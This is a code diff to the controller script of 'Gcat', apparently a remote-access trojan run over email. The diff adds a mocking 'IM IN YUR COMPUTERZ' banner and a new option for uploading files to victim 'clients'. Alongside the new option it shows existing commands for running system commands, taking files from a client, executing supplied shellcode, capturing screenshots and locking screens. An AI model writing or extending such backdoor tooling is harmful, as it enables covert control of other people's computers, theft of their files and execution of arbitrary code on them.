@@ -12,6 +12,7 @@ import random
 from datetime import datetime
 from base64 import b64decode
 from smtplib import SMTP
+from argparse import RawTextHelpFormatter
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEBase import MIMEBase
 from email.MIMEText import MIMEText
@@ -168,7 +169,40 @@ class Gcat:
 
 if __name__ == '__main__':
 
-    parser = argparse.ArgumentParser(description="Gcat", version='0.0.1')
+    parser = argparse.ArgumentParser(description="""
+                                             dP   
+                                             88   
+                .d8888b. .d8888b. .d8888b. d8888P 
+                88'  `88 88'  `"" 88'  `88   88   
+                88.  .88 88.  ... 88.  .88   88   
+                `8888P88 `88888P' `88888P8   dP   
+                     .88                          
+                 d8888P  
+                     
+
+                   .__....._             _.....__,
+                     .": o :':         ;': o :".
+                     `. `-' .'.       .'. `-' .'   
+                       `---'             `---'  
+
+             _...----...      ...   ...      ...----..._
+          .-'__..-''----    `.  `"`  .'    ----'''-..__`-.
+         '.-'   _.--'''       `-._.-'       ''''--._   `-.`
+         '  .-"'                  :                  `"-.  `
+           '   `.              _.'"'._              .'   `
+                 `.       ,.-'"       "'-.,       .'
+                   `.                           .'
+              jgs    `-._                   _.-'
+                         `"'--...___...--'"`
+
+                     ...IM IN YUR COMPUTERZ...
+
+                        WATCHIN YUR SCREENZ
+""",                                 
+                                     version='1.0.0',
+                                     formatter_class=RawTextHelpFormatter,
+                                     epilog='Meow!')
+
     parser.add_argument("-id", dest='id', type=str, default=None, help="Client to target")
     parser.add_argument('-jobid', dest='jobid', default=None, type=str, help='Job id to retrieve')
     
@@ -181,6 +215,7 @@ if __name__ == '__main__':
     slogopts = sgroup.add_mutually_exclusive_group()
     slogopts.add_argument("-cmd", metavar='CMD', dest='cmd', type=str, help='Execute a system command')
     slogopts.add_argument("-download", metavar='PATH', dest='download', type=str, help='Download a file from a clients system')
+    slogopts.add_argument("-upload", nargs=2, metavar=('SRC', 'DST'), help="Upload a file to the clients system")
     slogopts.add_argument("-exec-shellcode", metavar='FILE',type=argparse.FileType('rb'), dest='shellcode', help='Execute supplied shellcode on a client')
     slogopts.add_argument("-screenshot", dest='screen', action='store_true', help='Take a screenshot')
     slogopts.add_argument("-lock-screen", dest='lockscreen', action='store_true', help='Lock the clients screen')
@@ -211,6 +246,9 @@ if __name__ == '__main__':
 
     elif args.download:
         gcat.sendEmail(args.id, jobid, 'download', r'{}'.format(args.download))
+
+    elif args.upload:
+        gcat.sendEmail(args.id, jobid, 'upload', r'{}'.format(args.upload[1]), [args.upload[0]])
 
     elif args.screen:
         gcat.sendEmail(args.id, jobid, 'screenshot')
